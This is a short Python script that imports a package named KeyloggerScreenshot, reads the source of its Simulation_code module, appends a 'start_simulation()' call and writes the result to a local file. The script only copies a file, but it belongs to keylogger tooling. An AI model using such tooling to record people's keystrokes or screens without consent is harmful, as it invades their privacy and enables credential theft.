import KeyloggerScreenshot as ks

get_name = str(ks.Simulation_code).split("from")
full_name = get_name[1].split(">")[0]
full_name = full_name.split()[0]
full_name = full_name.split("'")[1]

with open(full_name, "r+") as file:
    data = [each for each in file]
    data += "\n\nSimulation.start_simulation()"

with open("Simulation_code.py", "a+") as file:
    for line in data:
        file.write(line)